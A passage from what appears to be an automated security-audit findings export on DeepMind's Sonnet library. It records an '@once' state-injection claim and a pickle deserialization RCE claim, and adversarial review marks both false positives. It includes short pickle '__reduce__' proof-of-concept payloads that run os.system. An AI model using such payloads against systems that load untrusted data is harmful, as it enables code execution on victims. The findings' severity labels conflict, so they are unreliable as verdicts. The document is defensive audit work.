lifecycle.\n\n**Why the attack fails cross-process:**\n\n1. `once_id = uuid.uuid4()` at `once.py:70` generates a new random UUID each time the `once()` decorator is applied.\n2. For Module subclasses, the `ModuleMetaclass.__new__` at `base.py:300-304` re-wraps `@once` methods with a fresh `once.once()` call during class creation.\n3. Class creation happens at import time, which occurs independently in each process.\n4. Therefore, the `once_id` in the victim's process is a different random UUID from the one stored in any pickle created by a different process.\n5. The check `if once_id not in seen` at `once.py:88` evaluates to `True` (victim's new UUID is NOT in the attacker's pre-populated set), so initialization runs normally.\n\n**Reproduction evidence:**\n- Cross-process: Attacker's poisoned pickle (x=999) was overwritten by legitimate initialization (x=42) when loaded in a separate process. The victim's `_snt_once` ended up with TWO UUIDs -- the stale one from the pickle and the new one from the victim's process.\n- Same-process: Attack succeeds but requires attacker to already have code execution in the victim's process, which is strictly more powerful than model poisoning.\n\n**Additional note:** Even if this attack worked, it would be strictly subsumed by pickle RCE via `__reduce__` (p8-001), since any attacker who can get a victim to load arbitrary pickle data can achieve arbitrary code execution, which is more powerful than `@once` bypass.\n\nFull review: `archon/adversarial-reviews/once-state-injection-pickle-review.md`\nReproduction log: `archon/real-env-evidence/once-state-injection-pickle/reproduction-log.md`\n","severity":"high","confidence":"tentative","tags":["archon","phase-8","false positive (adversarial)","poc-pending"],"status":"open","cvss_score":0,"source_file":"sonnet/src/once.py:83-90","repo_name":"https://github.com/deepmind/sonnet","matched_at":["sonnet/src/once.py:83-90","sonnet/src/once.py:70","sonnet/src/once.py:86","sonnet/src/once.py:88"],"finding_hash":"ea38cc282e3167b84298aaf2a44a37e6","found_at":"2026-04-18T18:34:06.134282Z","created_at":"2026-04-18T18:34:06Z"}},{"type":"finding","data":{"id":4,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"f944fef2-2cd2-4ea4-8600-907088fb7eea","module_id":"archon:p8-001","module_name":"Sonnet v2's `Module` base class (`sonnet/src/base.py:368`) has no protection against arbitrary code execution via Python's pickle deserialization protocol. The `Module` class inherits from `tf.Module`","module_type":"whitebox","finding_source":"archon","module_short":"pickle-rce-no-guard","description":"## Summary\n\nSonnet v2's `Module` base class (`sonnet/src/base.py:368`) has no protection against arbitrary code execution via Python's pickle deserialization protocol. The `Module` class inherits from `tf.Module` and uses `ModuleMetaclass`, but defines no `__getstate__`, `__reduce__`, or `__reduce_ex__` methods. The metaclass at `base.py:73` explicitly skips all dunder methods (`elif key.startswith(\"__\") and key != \"__call__\": continue`), architecturally preventing any metaclass-level pickle guard.\n\nThis is a deliberate regression from Sonnet v1, where commit `542e5da` added a `__getstate__` guard raising `NotSupportedError` on `AbstractModule`. The v2 rewrite intentionally removed this guard to support pickle as a serialization format for eager-mode modules. The conformance test suite (`pickle_test.py:34`) explicitly validates that all golden modules can be round-tripped through `pickle.loads(pickle.dumps(m))`, establishing pickle as a tested and supported interface.\n\nAny system that deserializes untrusted pickle data typed as a Sonnet module subclass is vulnerable to arbitrary code execution via Python's `__reduce__` protocol.\n\n## Location\n\n- **Primary defect**: `sonnet/src/base.py:368` -- `class Module(tf.Module, metaclass=ModuleMetaclass)` -- missing `__getstate__`/`__reduce__` guard\n- **Root cause (architectural)**: `sonnet/src/base.py:73` -- `elif key.startswith(\"__\") and key != \"__call__\": continue` -- metaclass skips all dunder methods, preventing metaclass-level pickle guard injection\n- **Evidence of design intent**: `sonnet/src/conformance/pickle_test.py:34` -- `m2 = pickle.loads(pickle.dumps(m1))` -- confirms pickle is a supported interface\n- **Historical guard (removed)**: commit `542e5da` -- v1 `AbstractModule.__getstate__` raised `NotSupportedError`\n\n## Attacker Control\n\nFull. The attacker crafts the entire pickle byte stream. The payload is a standard Python pickle containing a `__reduce__` tuple pointing to any callable (e.g., `os.system`, `subprocess.Popen`, `exec`). No Sonnet-specific knowledge is required beyond knowing the target expects a Sonnet module.\n\nExample payload structure:\n```python\nimport pickle, os\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, (\"id \u003e /tmp/pwned\",))\npayload = pickle.dumps(Exploit())\n# victim: pickle.loads(payload)  # executes os.system(\"id \u003e /tmp/pwned\")\n```\n\n## Trust Boundary Crossed\n\nDeserialization trust boundary: untrusted bytes from an external source (model hub, federated learning coordinator, shared filesystem, network transfer) are deserialized into executable code within the victim's process. This crosses:\n- **User-to-user boundary**: in multi-tenant ML platforms where users share models\n- **Network boundary**: when pickle bytes are transferred over the network\n- **Privilege boundary**: the deserialized code runs with the victim process's privileges (which may include GPU access, filesystem access, network access, cloud credentials)\n\n## Impact\n\n- **Arbitrary code execution** in the deserializing process with the process's full privileges\n- **Lateral movement**: in ML pipelines, the victim process typically has access to training data, model weights, cloud storage credentials, and GPU resources\n- **Supply chain poisoning**: a compromised model on a hub can execute code on every downloader\n- **No detection signal**: standard pickle deserialization produces no log entries, no warnings, no exceptions before the payload executes\n\n## Evidence\n\n1. **Source code -- no guard**: `base.py:368` defines `Module(tf.Module, metaclass=ModuleMetaclass)` with no `__getstate__`, `__reduce__`, or `__reduce_ex__` (verified by source reading and grep)\n2. **Metaclass prevents fix**: `base.py:73` -- the dunder-skip rule prevents adding pickle guards via metaclass patching\n3. **Conformance test confirms interface**: `pickle_test.py:34` -- `pickle.loads(pickle.dumps(m1))` succeeds for all golden modules\n4. **V1 guard removal**: commit `542e5da` added `__getstate__` guard to v1 `AbstractModule`; this guard does not exist in v2\n5. **No RestrictedUnpickler**: grep of entire codebase confirms no `RestrictedUnpickler` or `Unpickler` subclass exists\n6. **Probe validation**: Deep Probe PH-01 validated as CRITICAL; PH-C03 confirmed metaclass root cause\n\n## Reproduction Steps\n\n1. Create a minimal Python script:\n```python\nimport pickle\nimport os\n\n# Craft a malicious pickle payload\nclass MaliciousModule:\n    def __reduce__(self):\n        return (os.system, (\"echo EXPLOITED \u003e /tmp/pickle_rce_proof\",))\n\npayload = pickle.dumps(MaliciousModule())\n\n# Simulate victim loading what they believe is a Sonnet module\nobj = pickle.loads(payload)\n\n# Check /tmp/pickle_rce_proof -- the file was created\n```\n2. The payload executes `os.system()` during `pickle.loads()` before any type checking occurs.\n3. Note: no Sonnet-specific code is needed in the payload -- the vulnerability is the ABSENCE of a guard on the Module class that would prevent this.\n4. To demonstrate with an actual Sonnet module subclass, create a pickle where the `__reduce__` method is injected into the byte stream for a legitimate Sonnet module class.\n\n## Cold Verification\n\nAdversarial-Verdict: DISPROVED\nAdversarial-Rationale: The finding attributes Python pickle's inherent unsafety to a library that provides no deserialization API and no untrusted input path; the PoC uses zero Sonnet code, demonstrating generic pickle behavior rather than a Sonnet-specific vulnerability.\nSeverity-Final: LOW\nPoC-Status: theoretical\nVerdict: FALSE POSITIVE (adversarial)\n\n### Sub-claim Verification\n\n1. **Module lacks pickle guards (CONFIRMED):** Grep of entire `sonnet/` directory confirms zero matches for `__getstate__`, `__reduce__`, `__reduce_ex__`. The Module class at `base.py:368` defines no pickle serialization guards.\n\n2. **Metaclass prevents pickle guards (PARTIALLY INCORRECT):** The metaclass at `base.py:73` (`elif key.startswith(\"__\") and key != \"__call__\": continue`) skips dunder method
